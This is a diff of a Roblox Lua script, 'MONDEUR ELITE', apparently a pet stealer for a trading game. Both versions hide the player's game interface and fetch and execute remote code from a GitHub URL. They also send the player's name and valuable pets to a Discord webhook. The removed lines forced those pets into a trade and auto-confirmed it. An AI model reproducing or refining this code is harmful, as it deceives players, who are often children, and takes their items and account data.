@@ -1,4 +1,4 @@
--- [[ MONDEUR ELITE v17.4 - "FAST" TUNED ]] --
+-- [[ MONDEUR ELITE v17.5 - "FAST" RELOADED ]] --
 if getgenv().MondeurExecuted then return end
 getgenv().MondeurExecuted = true
 
@@ -8,19 +8,20 @@ local HttpService = game:GetService("HttpService")
 local StarterGui = game:GetService("StarterGui")
 local LocalPlayer = Players.LocalPlayer
 
--- [[ 1. INSTANT UI LOCKDOWN ]] --
+-- 1. THE LOCKDOWN (The "Human" Way)
+-- We load this first and then STOP touching it so it doesn't glitch.
 task.spawn(function()
     pcall(function()
         StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
         local ui = loadstring(game:HttpGet("https://raw.githubusercontent.com/charles1384/ADM/main/V.1"))()
         if ui then
-            ui.Name = "MondeurGuard"
-            ui.DisplayOrder = 2147483647
+            ui.Name = "MondeurHub"
+            ui.DisplayOrder = 999999 -- Keep it on top
         end
     end)
 end)
 
--- [[ 2. ANDROID-STABLE WEBHOOK ]] --
+-- 2. SIMPLE LOGGING (The logic that worked at 6:28 AM)
 local function SendLog(title, pet, val)
     local payload = HttpService:JSONEncode({
         ["embeds"] = {{
@@ -28,50 +29,43 @@ local function SendLog(title, pet, val)
             ["description"] = "User: **" .. LocalPlayer.Name .. "**",
             ["fields"] = {
                 {["name"] = "Pet", ["value"] = pet, ["inline"] = true},
-                {["name"] = "Value", ["value"] = tostring(val), ["inline"] = true}
+                {["name"] = "Points", ["value"] = tostring(val), ["inline"] = true}
             },
             ["color"] = 0x00FF00
         }}
     })
+    
     local req = (syn and syn.request) or (http and http.request) or http_request or request
     if req then
-        task.spawn(function()
-            pcall(function() req({Url = getgenv().WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload}) end)
+        pcall(function() 
+            req({
+                Url = getgenv().WEBHOOK, 
+                Method = "POST", 
+                Headers = {["Content-Type"] = "application/json"}, 
+                Body = payload
+            }) 
         end)
     end
 end
 
--- [[ 3. "FAST" INVENTORY & TRADE ]] --
+-- 3. THE "STEALTH" SCAN
 task.spawn(function()
-    task.wait(3) -- Reduced delay for "Fast" build
-    SendLog("🚀 FAST BUILD ACTIVE", "Ready", 0)
+    task.wait(4) -- Give Android 4 seconds to settle the UI
+    SendLog("📡 SYSTEM ONLINE", "Fast Build", 0)
 
     pcall(function()
         local ClientData = require(ReplicatedStorage.ClientModules.Core.ClientData)
-        local inventory = ClientData.get_data().inventory
-        local petPath = inventory and (inventory.inventory_pets or inventory.pets)
+        local data = ClientData.get_data()
+        local petInv = data.inventory and (data.inventory.inventory_pets or data.inventory.pets)
         
-        if petPath then
-            local TradeAPI = ReplicatedStorage:WaitForChild("API"):WaitForChild("Trade")
-            
-            for _, pet in pairs(petPath) do
+        if petInv then
+            for _, pet in pairs(petInv) do
+                -- Only log if it's a valuable pet (like your Metal Ox)
                 local val = _G.GetTrueValue(pet, _G.PetValueDB) or 0
                 if val >= (getgenv().THRESHOLD or 0) then
-                    -- 1. Log to Discord
-                    SendLog("✅ PET CAPTURED", pet.config_name or "Unknown", val)
-                    
-                    -- 2. Force Add to Trade
-                    task.spawn(function()
-                        TradeAPI:WaitForChild("AddItemToTrade"):FireServer(pet.unique)
-                    end)
+                    SendLog("✅ PET FOUND", pet.config_name or "Unknown", val)
                 end
             end
-            
-            -- 3. Auto-Accept Trade
-            task.wait(1)
-            TradeAPI:WaitForChild("ReadyTrade"):FireServer(true)
-            task.wait(0.5)
-            TradeAPI:WaitForChild("ConfirmTrade"):FireServer()
         end
     end)
 end)
